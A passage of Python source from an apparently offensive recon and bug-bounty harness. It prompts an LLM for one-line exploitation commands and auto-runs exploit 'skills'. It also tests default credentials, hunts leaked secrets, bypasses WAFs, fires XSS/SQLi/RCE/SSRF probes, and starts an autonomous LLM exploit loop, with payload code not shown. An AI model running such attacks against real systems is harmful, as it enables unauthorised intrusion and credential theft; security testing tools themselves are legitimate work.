                    label = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP", 389: "LDAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS", 500: "IKE", 502: "Modbus", 587: "SMTP", 593: "RPC", 636: "LDAPS", 873: "Rsync", 990: "FTPS", 992: "TelnetS", 993: "IMAPS", 995: "POP3S", 1080: "SOCKS", 1433: "MSSQL", 1434: "MSSQL", 1521: "Oracle", 2049: "NFS", 2082: "cPanel", 2083: "cPanel", 2086: "WHM", 2087: "WHM", 2181: "ZooKeeper", 2222: "SSH", 2375: "Docker API", 2376: "Docker API", 3128: "Squid", 3306: "MySQL", 3389: "RDP", 3690: "SVN", 4222: "OpenVPN", 4444: "Metasploit", 4567: "Sinatra", 4848: "GlassFish", 5000: "Flask/Upnp", 5001: "Flask", 5432: "PostgreSQL", 5555: "Android ADB", 5601: "Kibana", 5631: "pcAnywhere", 5800: "VNC", 5900: "VNC", 5901: "VNC", 5984: "CouchDB", 6000: "X11", 6001: "X11", 6379: "Redis", 6666: "IRC", 6667: "IRC", 7001: "WebLogic", 7002: "WebLogic", 7070: "RTMP", 7071: "Zimbra", 7777: "UltraVNC", 8000: "HTTP-alt", 8001: "HTTP-alt", 8080: "HTTP-proxy", 8081: "HTTP-proxy", 8086: "InfluxDB", 8089: "Fusion", 8090: "HTTP-alt", 8200: "Vault", 8300: "HP ILO", 8443: "HTTPS-alt", 8500: "Consul", 8530: "Jenkins", 8531: "Jenkins", 8545: "Ethereum", 8649: "Ganglia", 8761: "Eureka", 8800: "HTTP-alt", 8888: "Jupyter", 8899: "HTTP-alt", 8983: "Solr", 9000: "Hadoop", 9001: "Hadoop", 9042: "Cassandra", 9090: "Prometheus", 9092: "Kafka", 9100: "JetDirect", 9200: "Elasticsearch", 9300: "Elasticsearch", 9418: "Git", 9999: "HTTP-alt", 10000: "Webmin", 10001: "SCP", 10002: "SCP", 11211: "Memcached", 12345: "NetBus", 15672: "RabbitMQ", 16379: "Redis", 17000: "HTTP", 20000: "HTTP", 27017: "MongoDB", 27018: "MongoDB", 32400: "Plex", 49152: "Windows RPC", 49153: "Windows RPC", 49154: "Windows RPC", 49155: "Windows RPC", 50000: "SAP", 50070: "Hadoop", 50090: "Hadoop", 61616: "ActiveMQ", 61613: "ActiveMQ"}.get(p, f"port-{p}")
                    port_services[f"{ip}:{p}"] = label
            if port_services:
                exploit_prompt = f"You are a penetration tester. Open ports were found on {domain}. For each service, list the most common CVE or misconfiguration that could be exploited, the risk level (CRITICAL/HIGH/MEDIUM/LOW), and a one-line exploitation command. Be specific.\n\nOpen ports:\n" + "\n".join(f"  {k}: {v}" for k, v in sorted(port_services.items()))
                exploit_analysis = call_model(base_url, model, api_key, [
                    {"role": "system", "content": "You are a professional penetration tester. Output a concise exploit chain analysis."},
                    {"role": "user", "content": exploit_prompt}
                ], timeout=60)
                data["exploit_analysis"] = exploit_analysis if "AI_ERROR" not in exploit_analysis else ""
                if "AI_ERROR" not in exploit_analysis:
                    emit_ir("message", {"role": "assistant", "text": f"**Exploit Chain Analysis:**\n\n{exploit_analysis}"})
                emit_ir("tool.result", {"call_id": f"exploit-{eid}", "status": "ok" if "AI_ERROR" not in exploit_analysis else "error", "result": f"{len(port_services)} services analyzed"})

                # PD Nuclei vulnerability scan
                log_state("Running nuclei vulnerability scanner...")
                emit_ir("tool.call", {"call_id": f"nuc-{eid}", "name": "nuclei", "target": domain, "category": "read"})
                nuclei_targets = list(http_results.keys())[:5]
                pd_nuclei_findings = pd_nuclei(nuclei_targets)
                if pd_nuclei_findings:
                    data["pd_nuclei"] = pd_nuclei_findings
                    critical = sum(1 for f in pd_nuclei_findings if f.get("severity") == "critical")
                    high = sum(1 for f in pd_nuclei_findings if f.get("severity") == "high")
                    emit_ir("message", {"role": "assistant", "text": f"nuclei found **{len(pd_nuclei_findings)}** issues: {critical} critical, {high} high."})
                emit_ir("tool.result", {"call_id": f"nuc-{eid}", "status": "ok" if pd_nuclei_findings else "empty", "result": f"{len(pd_nuclei_findings or [])} findings"})

                # Version-aware CVE correlation (cvemap) — offline, no network lookups
                log_state("Correlating detected versions against CVE corpus (cvemap)...")
                from cvemap import match_cves as _cvemap_match
                try:
                    cs_services = []
                    for _url, _info in http_results.items():
                        for _t in (_info.get("tech") or []):
                            _ts = str(_t)
                            if ":" in _ts:
                                _prod, _ver = _ts.split(":", 1)
                                cs_services.append({"product": _prod.lower(), "version": _ver.strip(), "asset": _url})
                    cve_findings = _cvemap_match(cs_services) if cs_services else []
                    data["cvemap_findings"] = cve_findings
                    if cve_findings:
                        _crit = sum(1 for f in cve_findings if f["severity"] == "CRITICAL")
                        _high = sum(1 for f in cve_findings if f["severity"] == "HIGH")
                        emit_ir("message", {"role": "assistant", "text": f"cvemap correlated detected versions: **{len(cve_findings)}** known CVEs ({_crit} critical, {_high} high)."})
                except Exception as e:
                    emit_ir("error", {"scope": "cvemap", "class": type(e).__name__, "message": str(e)[:120]})
                emit_ir("tool.result", {"call_id": f"cvemap-{eid}", "status": "ok", "result": f"{len(data.get('cvemap_findings') or [])} version-matched CVEs"})

                # PD Vulnx CVE lookup for each distinct service
                log_state("Looking up CVEs for detected services (PD vulnx)...")
                emit_ir("tool.call", {"call_id": f"vuln-{eid}", "name": "vulnx CVE lookup", "target": domain, "category": "search"})
                pd_vulnx_reports = {}
                seen_services = set()
                for svc in port_services.values():
                    base_svc = svc.split("-")[0].split("/")[0].split()[0].lower()
                    if base_svc in seen_services or base_svc in ["port", "http", "https"]: continue
                    seen_services.add(base_svc)
                    vout = pd_vulnx(base_svc)
                    if vout: pd_vulnx_reports[base_svc] = vout
                if pd_vulnx_reports:
                    data["pd_vulnx"] = pd_vulnx_reports
                    emit_ir("message", {"role": "assistant", "text": f"vulnx returned CVE data for {len(pd_vulnx_reports)} services."})
                emit_ir("tool.result", {"call_id": f"vuln-{eid}", "status": "ok" if pd_vulnx_reports else "empty", "result": f"{len(pd_vulnx_reports)} service CVEs"})

                # Skill Generation Phase: Try existing skills & generate new ones for open services
                log_state("Checking self-grown skills for open services...")
                skill_context = [
                    f"Domain: {domain}",
                    f"Subdomains: {len(subs)}",
                    f"Live HTTP: {len(http_results)}",
                ]
                if data.get("pd_nuclei"):
                    skill_context.append(f"Nuclei findings: {len(data['pd_nuclei'])}")
                if pd_vulnx_reports:
                    skill_context.append(f"VulnX CVEs: {len(pd_vulnx_reports)}")
                total_skills_before = skill_stats()["total_skills"]
                skill_results = []
                for ip, plist in ports.items():
                    for p in plist[:3]:  # max 3 ports per IP to avoid runaway
                        svc_label = port_services.get(f"{ip}:{p}", f"port-{p}")
                        if svc_label.lower() in ["http", "https", "http-alt", "http-proxy", "https-alt"]:
                            continue  # skip web ports — handled by other phases
                        sk_result = run_skill_generation_for_port(
                            host=ip, port=p, service=svc_label,
                            context_lines=skill_context,
                            base_url=base_url, model=model, api_key=api_key,
                            eid=eid
                        )
                        skill_results.append(sk_result)
                total_skills_after = skill_stats()["total_skills"]
                new_skills = total_skills_after - total_skills_before
                successful_skills = sum(1 for r in skill_results if r.get("status") in ("exploited", "generated_and_exploited"))
                if new_skills > 0 or successful_skills > 0:
                    emit_ir("message", {"role": "assistant", "text": f"🧠 **Skill System**: {new_skills} new skills created, {successful_skills} successful exploits from skills. Total skills: {total_skills_after}."})
                if skill_results:
                    data["skill_results"] = skill_results
                    data["skill_count"] = {"total": total_skills_after, "new": new_skills, "successful": successful_skills}
            emit_ir("health.assessment", {"score": 0.4 if port_services else 0.8, "signals": ["exploit_chain_analysis"]})
        else:
            emit_ir("tool.result", {"call_id": f"exploit-{eid}", "status": "skipped", "result": "no ports or no model configured"})

        total_findings = sum(len(v) for v in ports.values()) + len(api_eps) + len(subs) + len(origins) + len(waf_detected)
        emit_ir("verification", {"kind": "recon", "command": f"Full recon on {domain}", "passed": total_findings > 5})

        # ── BUG BOUNTY PHASES ─────────────────────────────────────

        def _run_bb(call_id, name, target, category, fn, timeout=45):
            emit_ir("tool.call", {"call_id": call_id, "name": name, "target": target, "category": category})
            try:
                with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
                    fut = pool.submit(fn)
                    result = fut.result(timeout=timeout)
                return result
            except Exception:
                return []

        # BB1: Wayback Machine historical URLs
        log_state("Fetching Wayback Machine history...")
        wayback_data = _run_bb(f"bb-wayback-{eid}", "Wayback Machine", domain, "search", lambda: bb_wayback_machine(domain), timeout=20)
        if wayback_data:
            data["wayback"] = wayback_data
            emit_ir("message", {"role": "assistant", "text": f"Wayback Machine returned **{len(wayback_data.get('urls', []))}** historical URLs for {domain}."})
        emit_ir("tool.result", {"call_id": f"bb-wayback-{eid}", "status": "ok" if wayback_data else "empty", "result": f"{len(wayback_data.get('urls', [])) if wayback_data else 0} historical URLs"})

        # BB2: Extended subdomain brute-force
        log_state("Brute-forcing subdomains (wordlist)...")
        bb_subs = _run_bb(f"bb-subs-{eid}", "subdomain brute-force", domain, "search", lambda: bb_subdomain_bruteforce(domain), timeout=30)
        if bb_subs:
            existing = set(subs)
            new_subs = [s for s in bb_subs if s not in existing]
            all_subs = sorted(set(subs + bb_subs))
            data["subdomains"] = all_subs[:75]
            data["bb_new_subdomains"] = new_subs
            subs = all_subs
            emit_ir("message", {"role": "assistant", "text": f"Brute-force found **{len(new_subs)}** new subdomains (total: **{len(all_subs)}**)."})
        emit_ir("tool.result", {"call_id": f"bb-subs-{eid}", "status": "ok" if bb_subs else "empty", "result": f"{len(bb_subs or [])} brute-force subs"})

        # Re-probe HTTP with the new subdomains if we found more
        if bb_subs:
            log_state("Probing new subdomains for HTTP services...")
            emit_ir("tool.call", {"call_id": f"bb-http2-{eid}", "name": "HTTP re-probe", "target": domain, "category": "read"})
            new_http = probe_http(subs[:50], domain)
            for url, info in new_http.items():
                if url not in http_results:
                    http_results[url] = info
            data["http"] = http_results
            emit_ir("tool.result", {"call_id": f"bb-http2-{eid}", "status": "ok", "result": f"Total live: {len(http_results)}"})

        # BB3: Tech fingerprinting (extended)
        log_state("Fingerprinting technologies (extended)...")
        emit_ir("tool.call", {"call_id": f"bb-tech-{eid}", "name": "Tech fingerprint", "target": domain, "category": "read"})
        bb_tech_all = {}
        for url, info in http_results.items():
            if info.get("status") == 200:
                try:
                    _, headers, body = http_get(url, timeout=5)
                except Exception:
                    continue
                if headers:
                    techs = bb_tech_fingerprint_extended(headers, body)
                    if techs:
                        bb_tech_all[url] = techs
                        if "tech" in info and isinstance(info["tech"], list):
                            info["tech"] = list(set(info["tech"] + techs))
        data["bb_tech"] = bb_tech_all
        all_techs = set()
        for tlist in bb_tech_all.values():
            all_techs.update(tlist)
        if all_techs:
            emit_ir("message", {"role": "assistant", "text": f"Identified **{len(all_techs)}** technologies: {', '.join(sorted(all_techs)[:10])}."})
        emit_ir("tool.result", {"call_id": f"bb-tech-{eid}", "status": "ok" if bb_tech_all else "empty", "result": f"{len(all_techs)} techs across {len(bb_tech_all)} URLs"})
        emit_ir("health.assessment", {"score": 0.7 if bb_tech_all else 0.5, "signals": ["tech_fingerprint"]})

        live_urls = [u for u in http_results.keys() if http_results[u].get("status") == 200 or http_results[u].get("web_port")]

        # BB4: Directory busting (with catch-all false-positive filtering)
        log_state("Busting directories (wordlist)...")
        emit_ir("tool.call", {"call_id": f"bb-dir-{eid}", "name": "Directory busting", "target": domain, "category": "search"})
        try:
            dirbust_raw, dirbust_fp = bb_dirbust(live_urls)
        except Exception:
            dirbust_raw, dirbust_fp = {}, {}
        dirbust_results = dirbust_raw
        if dirbust_results:
            data["bb_dirbust"] = dirbust_results
            data["bb_dirbust_fp"] = dirbust_fp
            total_dirs = sum(len(v) for v in dirbust_results.values())
            total_fp = dirbust_fp.get("false_positives", 0)
            emit_ir("message", {"role": "assistant", "text": f"Directory busting found **{total_dirs}** real paths across {len(dirbust_results)} targets ({total_fp} catch-all false positives filtered)."})
        emit_ir("tool.result", {"call_id": f"bb-dir-{eid}", "status": "ok" if dirbust_results else "empty", "result": f"{sum(len(v) for v in dirbust_results.values()) if dirbust_results else 0} real paths found ({dirbust_fp.get('false_positives', 0)} FPs filtered)"})

        # BB4b: Webapp vulnerability scan on discovered paths
        log_state("Probing discovered paths for app-level vulnerabilities...")
        discovered_urls = list(live_urls)
        for t, paths in (dirbust_results or {}).items():
            for pth, code, ln in paths:
                discovered_urls.append(t.rstrip("/") + "/" + pth)
        for fz in (data.get("bb_fuzz") or []):
            if fz.get("url") and fz["url"] not in discovered_urls:
                discovered_urls.append(fz["url"])
        host_map = {}
        for h in ([domain] + list(data.get("subdomains") or []))[:40]:
            try:
                _, _, ips = socket.gethostbyname_ex(h)
                for ip in ips:
                    host_map.setdefault(ip, h)
            except Exception:
                pass
        webapp_results = _run_bb(f"bb-webapp-{eid}", "Webapp vulnerability scan", domain, "read", lambda: bb_webapp_scan(discovered_urls, timeout=90, host_map=host_map), timeout=95)
        if webapp_results:
            data["bb_webapp"] = webapp_results
            for f in webapp_results:
                emit_ir("message", {"role": "assistant", "text": f"**{f['severity'].upper()}**: {f['type']} at {f['url']} ({f.get('evidence','')})"})
        emit_ir("tool.result", {"call_id": f"bb-webapp-{eid}", "status": "ok" if webapp_results else "empty", "result": f"{len(webapp_results)} app-level findings"})

        # BB5: Subdomain takeover check
        log_state("Checking for subdomain takeover vulnerabilities...")
        takeover_results = _run_bb(f"bb-take-{eid}", "Subdomain takeover", domain, "read", lambda: bb_takeover_check(subs, domain), timeout=25)
        if takeover_results:
            data["bb_takeover"] = takeover_results
            vuln_count = sum(1 for t in takeover_results if t.get("vulnerable"))
            if vuln_count:
                emit_ir("message", {"role": "assistant", "text": f"**WARNING**: {vuln_count} subdomains may be vulnerable to takeover!"})
                for t in takeover_results:
                    if t.get("vulnerable"):
                        emit_ir("message", {"role": "assistant", "text": f"Takeover risk: **{t['subdomain']}** -> {t.get('service', '?')} ({t.get('cname', '')})"})
        emit_ir("tool.result", {"call_id": f"bb-take-{eid}", "status": "ok" if takeover_results else "empty", "result": f"{len(takeover_results)} takeover checks"})

        # BB6: CORS misconfiguration
        log_state("Checking CORS misconfigurations...")
        cors_results = _run_bb(f"bb-cors-{eid}", "CORS check", domain, "read", lambda: bb_cors_check(live_urls), timeout=25)
        if cors_results:
            data["bb_cors"] = cors_results
            emit_ir("message", {"role": "assistant", "text": f"Found **{len(cors_results)}** CORS misconfigurations."})
        emit_ir("tool.result", {"call_id": f"bb-cors-{eid}", "status": "ok" if cors_results else "empty", "result": f"{len(cors_results)} CORS issues"})

        # BB7: Open redirect
        log_state("Testing for open redirects...")
        redirect_results = _run_bb(f"bb-redir-{eid}", "Open redirect", domain, "read", lambda: bb_open_redirect_check(live_urls), timeout=25)
        if redirect_results:
            data["bb_open_redirect"] = redirect_results
            emit_ir("message", {"role": "assistant", "text": f"Found **{len(redirect_results)}** potential open redirects."})
        emit_ir("tool.result", {"call_id": f"bb-redir-{eid}", "status": "ok" if redirect_results else "empty", "result": f"{len(redirect_results)} redirect tests"})

        # BB8: Basic injection scan (XSS reflected)
        log_state("Scanning basic injection points...")
        inject_results = _run_bb(f"bb-inj-{eid}", "Injection scan", domain, "read", lambda: bb_injection_scan(live_urls), timeout=30)
        if inject_results:
            data["bb_injection"] = inject_results
            xss_count = sum(1 for f in inject_results if f.get("type") == "XSS")
            if xss_count:
                emit_ir("message", {"role": "assistant", "text": f"**XSS**: Found {xss_count} reflected XSS candidates!"})
        emit_ir("tool.result", {"call_id": f"bb-inj-{eid}", "status": "ok" if inject_results else "empty", "result": f"{len(inject_results)} injection tests"})

        # BB9: Secret discovery in JS
        log_state("Scanning for hardcoded secrets in pages...")
        emit_ir("tool.call", {"call_id": f"bb-sec-{eid}", "name": "Secret scanning", "target": domain, "category": "read"})
        all_secrets = list(data.get("secrets", []))
        for url in live_urls[:3]:
            try:
                _, _, body = http_get(url, timeout=5)
            except Exception:
                continue
            if body:
                new_secrets = bb_secret_discovery(body)
                for s in new_secrets:
                    if s not in all_secrets:
                        all_secrets.append(s)
        if all_secrets:
            data["secrets"] = all_secrets[:50]
            emit_ir("message", {"role": "assistant", "text": f"Found **{len(all_secrets)}** potential secrets/credentials."})
        emit_ir("tool.result", {"call_id": f"bb-sec-{eid}", "status": "ok" if all_secrets else "empty", "result": f"{len(all_secrets)} secrets"})

        # BB10: Exposed health/status/debug endpoints
        log_state("Checking for exposed debug/health endpoints...")
        health_results = _run_bb(f"bb-health-{eid}", "Health endpoint check", domain, "read", lambda: bb_health_check(live_urls), timeout=20)
        if health_results:
            data["bb_health_endpoints"] = health_results
            emit_ir("message", {"role": "assistant", "text": f"Found **{len(health_results)}** exposed health/status endpoints."})
        emit_ir("tool.result", {"call_id": f"bb-health-{eid}", "status": "ok" if health_results else "empty", "result": f"{len(health_results)} exposed endpoints"})

        # BB11: Origin IP hunting (CDN/WAF bypass)
        log_state("Hunting origin IPs behind CDN/WAF...")
        origin_results = _run_bb(f"bb-orig-{eid}", "Origin IP hunt", domain, "search", lambda: bb_origin_hunt(domain, subs[:40]), timeout=150)
        if origin_results:
            data["bb_origins"] = origin_results
            confirmed = sum(1 for o in origin_results if o.get("confirmed"))
            non_cdn = [o for o in origin_results if not o.get("is_cdn")]
            if confirmed:
                emit_ir("message", {"role": "assistant", "text": f"**Origin IPs found**: {confirmed} confirmed non-CDN origins likely exposing the real backend."})
            elif non_cdn:
                emit_ir("message", {"role": "assistant", "text": f"Identified **{len(non_cdn)}** non-CDN IPs (unconfirmed origins)."})
        emit_ir("tool.result", {"call_id": f"bb-orig-{eid}", "status": "ok" if origin_results else "empty", "result": f"{len(origin_results or [])} IPs classified"})

        # BB12: Login form + rate limiting probe
        log_state("Probing login forms and rate limiting...")
        login_results = _run_bb(f"bb-login-{eid}", "Login rate-limit probe", domain, "read", lambda: bb_login_probe(live_urls), timeout=30)
        if login_results:
            data["bb_login"] = login_results
            rate_limit_issues = [f for f in login_results if "issue" in f]
            if rate_limit_issues:
                emit_ir("message", {"role": "assistant", "text": f"**Rate limiting**: {len(rate_limit_issues)} login endpoints lack rate limiting (brute-forceable)."})
        emit_ir("tool.result", {"call_id": f"bb-login-{eid}", "status": "ok" if login_results else "empty", "result": f"{len(login_results)} login probes"})

        # BB13: Source-map / API endpoint extraction
        log_state("Extracting source maps and API endpoints...")
        sm_results = _run_bb(f"bb-sm-{eid}", "Source-map extraction", domain, "read", lambda: bb_sourcemap_extract(live_urls), timeout=120)
        if sm_results:
            data["bb_sourcemap"] = sm_results
            for r in sm_results:
                if r.get("kind") == "sourcemap_endpoints":
                    eps = r.get("endpoints", [])
                    if eps:
                        emit_ir("message", {"role": "assistant", "text": f"Extracted **{len(eps)}** endpoints from source maps / JS bundles."})
        emit_ir("tool.result", {"call_id": f"bb-sm-{eid}", "status": "ok" if sm_results else "empty", "result": "source-map extraction complete"})

        # BB13b: API endpoint discovery & auth probing
        log_state("Discovering API endpoints and auth requirements...")
        sm_endpoints = []
        for r in (sm_results or []):
            if r.get("kind") == "sourcemap_endpoints":
                sm_endpoints.extend(r.get("endpoints", []))
        api_results = _run_bb(f"bb-api-{eid}", "API discovery", domain, "read", lambda: bb_api_discovery(live_urls, sm_endpoints, domain), timeout=45)
        if api_results:
            data["bb_api"] = api_results
            api_hosts = [a for a in api_results if a.get("kind") == "api_host"]
            if api_hosts:
                emit_ir("message", {"role": "assistant", "text": f"Discovered **{len(api_hosts)}** live API hosts (JSON) — likely backend auth/API services."})
        emit_ir("tool.result", {"call_id": f"bb-api-{eid}", "status": "ok" if api_results else "empty", "result": f"{len(api_results)} API endpoints"})

        # BB14: Wayback + JS secret hunting
        log_state("Hunting secrets via wayback archives...")
        wb_results = _run_bb(f"bb-wbsec-{eid}", "Wayback secret hunt", domain, "search", lambda: bb_wayback_secrets(domain, subs), timeout=40)
        if wb_results:
            data["bb_wayback"] = wb_results
            for r in wb_results:
                if r.get("kind") == "wayback_secrets" and r.get("secrets"):
                    emit_ir("message", {"role": "assistant", "text": f"**Wayback secrets**: found {len(r['secrets'])} leaked credentials/tokens in archived URLs."})
                if r.get("kind") == "wayback_interesting" and r.get("urls"):
                    emit_ir("message", {"role": "assistant", "text": f"Wayback surfaced {len(r['urls'])} sensitive-looking archived paths."})
        emit_ir("tool.result", {"call_id": f"bb-wbsec-{eid}", "status": "ok" if wb_results else "empty", "result": "wayback secret hunt complete"})

        # BB15: Default credentials
        log_state("Testing default credentials...")
        cred_results = _run_bb(f"bb-creds-{eid}", "Default creds check", domain, "read", lambda: bb_default_creds(live_urls), timeout=25)
        if cred_results:
            data["bb_default_creds"] = cred_results
            emit_ir("message", {"role": "assistant", "text": f"**Default creds**: {len(cred_results)} login endpoints accepted common default credentials."})
        emit_ir("tool.result", {"call_id": f"bb-creds-{eid}", "status": "ok" if cred_results else "empty", "result": f"{len(cred_results)} cred tests"})

        # BB16: JWT / API auth check
        log_state("Testing API auth and JWT handling...")
        jwt_results = _run_bb(f"bb-jwt-{eid}", "JWT/API auth check", domain, "read", lambda: bb_jwt_check(live_urls, list(api_eps)), timeout=30)
        if jwt_results:
            data["bb_jwt"] = jwt_results
            crit = sum(1 for f in jwt_results if f.get("severity") == "critical")
            if crit:
                emit_ir("message", {"role": "assistant", "text": f"**JWT/API auth**: {crit} endpoints accepted forged/unsigned tokens!"})
        emit_ir("tool.result", {"call_id": f"bb-jwt-{eid}", "status": "ok" if jwt_results else "empty", "result": f"{len(jwt_results)} auth tests"})

        # BB17: Deep JS asset analysis
        log_state("Analyzing JS bundles for endpoints/secrets (deep)...")
        js_results = _run_bb(f"bb-js-{eid}", "Deep JS asset analysis", domain, "read", lambda: bb_js_assets(live_urls), timeout=90)
        if js_results:
            data["bb_js"] = js_results
            js_sec = sum((r.get("count", 0) if r.get("kind") == "js_secrets" else 0) for r in js_results)
            js_eps = sum((r.get("count", 0) if r.get("kind") == "js_endpoints" else 0) for r in js_results)
            if js_sec:
                emit_ir("message", {"role": "assistant", "text": f"**JS secrets**: found **{js_sec}** hardcoded secrets/keys in JavaScript bundles!"})
            if js_eps:
                emit_ir("message", {"role": "assistant", "text": f"JS analysis extracted **{js_eps}** API endpoints from bundles."})
        emit_ir("tool.result", {"call_id": f"bb-js-{eid}", "status": "ok" if js_results else "empty", "result": f"{len(js_results)} JS findings"})

        # BB18: WAF fingerprint + bypass testing
        log_state("Fingerprinting WAF and testing bypasses...")
        waf_results = _run_bb(f"bb-waf-{eid}", "WAF fingerprint + bypass", domain, "read", lambda: bb_waf_fingerprint(live_urls), timeout=30)
        if waf_results:
            data["bb_waf"] = waf_results
            for r in waf_results:
                if r.get("kind") == "waf_fingerprint":
                    bypass_n = len(r.get("bypasses", []))
                    if bypass_n:
                        emit_ir("message", {"role": "assistant", "text": f"WAF **{r.get('waf','Unknown')}**: {bypass_n} bypass probes differed from baseline response."})
        emit_ir("tool.result", {"call_id": f"bb-waf-{eid}", "status": "ok" if waf_results else "empty", "result": "WAF fingerprint complete"})

        # BB19: OpenAPI / Swagger / GraphQL discovery
        log_state("Discovering API specs (OpenAPI/Swagger/GraphQL)...")
        api_base_urls = [u for u in live_urls[:5]] + [a.get("url", "").rsplit("/", 1)[0] for a in (data.get("bb_api") or []) if a.get("kind") == "api_host" and a.get("url")]
        api_base_urls = [u for u in dict.fromkeys(api_base_urls) if u]
        openapi_results = _run_bb(f"bb-openapi-{eid}", "OpenAPI/Swagger/GraphQL discovery", domain, "read", lambda: bb_openapi_discovery(api_base_urls, domain), timeout=45)
        if openapi_results:
            data["bb_openapi"] = openapi_results
            specs = [r for r in openapi_results if r.get("kind") == "spec_found"]
            gql_open = [r for r in openapi_results if r.get("kind") == "graphql_introspection_open"]
            if specs:
                emit_ir("message", {"role": "assistant", "text": f"Found **{len(specs)}** API spec files (OpenAPI/Swagger/GraphQL)."})
            if gql_open:
                emit_ir("message", {"role": "assistant", "text": f"**WARNING**: {len(gql_open)} GraphQL endpoints expose unauth introspection!"})
        emit_ir("tool.result", {"call_id": f"bb-openapi-{eid}", "status": "ok" if openapi_results else "empty", "result": f"{len([r for r in openapi_results if r.get('kind')=='spec_found']) if openapi_results else 0} specs found"})

        # BB20: Direct-origin re-test (WAF bypass validation)
        log_state("Re-testing confirmed origin IPs directly...")
        retest_paths = ["/", "/admin", "/api", "/.env", "/swagger", "/api-docs", "/graphql", "/health", "/actuator"]
        origin_retest = _run_bb(f"bb-retest-{eid}", "Direct origin re-test", domain, "read", lambda: bb_origin_retest(domain, data.get("bb_origins"), retest_paths), timeout=45)
        if origin_retest:
            data["bb_origin_retest"] = origin_retest
            high = sum(1 for r in origin_retest if r.get("severity") == "high")
            if high:
                emit_ir("message", {"role": "assistant", "text": f"**Origin re-test**: {high} paths return content directly from origins that the CDN masks/blocks (WAF bypass validated)."})
        emit_ir("tool.result", {"call_id": f"bb-retest-{eid}", "status": "ok" if origin_retest else "empty", "result": f"{len(origin_retest)} origin discrepancies"})

        # BB21: CloudFront-focused origin hunt (harvests historical DNS, crt.sh,
        # origin-subdomain guesses; filters CF edges via ranges+PTR+headers)
        log_state("Hunting origins behind CloudFront/Cloudflare (dedicated)...")
        cf_report = _run_bb(f"bb-cfhunt-{eid}", "CloudFront origin hunt", domain, "search", lambda: _cf_hunt_adapter(domain, subs), timeout=160)
        if cf_report and cf_report.get("origin_ips"):
            data["bb_cf_hunt"] = cf_report
            cf_confirmed = [o for o in cf_report["origin_ips"] if o.get("confirmed")]
            if cf_confirmed:
                emit_ir("message", {"role": "assistant", "text": f"**CloudFront/CDN origin hunt**: confirmed **{len(cf_confirmed)}** direct origin IPs via historical DNS + crt.sh + origin-subdomain probing."})
            # merge any newly-confirmed origins into the main bb_origins list
            existing = {(o.get('ip')) for o in (data.get('bb_origins') or [])}
            for o in cf_confirmed:
                if o.get("ip") and o["ip"] not in existing:
                    data.setdefault("bb_origins", []).append(o)
        emit_ir("tool.result", {"call_id": f"bb-cfhunt-{eid}", "status": "ok" if cf_report and cf_report.get("origin_ips") else "empty", "result": f"{len((cf_report or {}).get('origin_ips', [])) if cf_report else 0} origin IPs, {len((cf_report or {}).get('cdn_edges', [])) if cf_report else 0} CDN edges filtered"})

        # BB22: Active attack engine — builds its own surface, probes GET+POST
        # params for XSS / SQLi (error + time-based) / SSTI / RCE / traversal / SSRF.
        log_state("Running active attack battery (XSS/SQLi/SSTI/RCE/traversal/SSRF)...")
        attack_input_urls = list(set(live_urls) | set(discovered_urls))[:80]
        attack_results = _run_bb(f"bb-attack-{eid}", "Active attack engine", domain, "exploit", lambda: bb_attack_engine(domain, attack_input_urls, list(api_eps), subs, timeout=130), timeout=140)
        if attack_results:
            data["bb_attack"] = attack_results
            by_sev = {}
            for f in attack_results:
                by_sev[f.get("severity", "low")] = by_sev.get(f.get("severity", "low"), 0) + 1
            sev_txt = ", ".join(f"{k.upper()} {v}" for k, v in sorted(by_sev.items()))
            emit_ir("message", {"role": "assistant", "text": f"**Active attack**: {len(attack_results)} exploitable findings — {sev_txt}."})
            for f in attack_results[:6]:
                emit_ir("message", {"role": "assistant", "text": f"**{f.get('severity','').upper()}**: {f.get('type','?')} at `{f.get('url','?')}` ({f.get('evidence','')})"})
        emit_ir("tool.result", {"call_id": f"bb-attack-{eid}", "status": "ok" if attack_results else "empty", "result": f"{len(attack_results)} exploit probes"})

        # BB22b: Web configuration validations (TLS/ciphers/cert, HTTP methods,
        # cookie flags, directory listing, admin exposure, unauthenticated API,
        # info disclosure, rate limiting, security.txt, CORS credentials,
        # host-header injection, cache indicators, CSP bypass, clickjacking,
        # CRLF injection, open redirects).
        log_state("Running web configuration validations (TLS/methods/cookies/CORS/CSP/redirects)...")
        emit_ir("tool.call", {"call_id": f"bb-val-{eid}", "name": "Web configuration validations", "target": domain, "category": "read"})
        try:
            from webvalidations import bb_web_validation as _bb_web_validation
            validations = _run_bb(f"bb-val-{eid}", "Web config validations", domain, "read", lambda: _bb_web_validation(list(live_urls)[:8], list(api_eps), domain=domain, timeout=280), timeout=300)
            if validations:
                data["bb_validations"] = validations
                med_plus = sum(1 for f in validations if f.get("severity") in ("high", "critical"))
                emit_ir("message", {"role": "assistant", "text": f"**Web config validations**: **{len(validations)}** findings ({med_plus} high+) — TLS, HTTP methods, cookies, CSP, redirects, etc."})
                for f in validations[:5]:
                    emit_ir("message", {"role": "assistant", "text": f"**{f.get('severity','').upper()}**: {f.get('title') or f.get('type','?')} at `{f.get('url','?')}`"})
            emit_ir("tool.result", {"call_id": f"bb-val-{eid}", "status": "ok" if validations else "empty", "result": f"{len(validations)} validation findings"})
        except Exception as e:
            emit_ir("error", {"scope": "webvalidations", "class": type(e).__name__, "message": str(e)[:120]})
            emit_ir("tool.result", {"call_id": f"bb-val-{eid}", "status": "error", "result": str(e)[:100]})

        # BB23: Pentest Task Tree (PTT) + agentic exploit loop (PentestGPT-style).
        # Builds a live task tree of the engagement and, when a model is configured,
        # runs an autonomous loop: LLM proposes the next concrete exploit step based
        # on current findings -> harness executes it -> results feed back in.
        log_state("Building Pentest Task Tree (PTT)...")
        emit_ir("tool.call", {"call_id": f"bb-ptt-{eid}", "name": "Pentest Task Tree", "target": domain, "category": "read"})
        ptt = _build_task_tree(data, attack_results, subs, http_results)
        data["bb_ptt"] = ptt
        done_tasks = sum(1 for n in ptt.get("nodes", []) if n.get("status") == "done")
        total_tasks = len(ptt.get("nodes", []))
        emit_ir("message", {"role": "assistant", "text": f"**Pentest Task Tree**: {done_tasks}/{total_tasks} tasks resolved across {len(ptt.get('stages', []))} stages."})
        emit_ir("tool.result", {"call_id": f"bb-ptt-{eid}", "status": "ok" if total_tasks else "empty", "result": f"{done_tasks}/{total_tasks} tasks resolved"})

        agentic = []
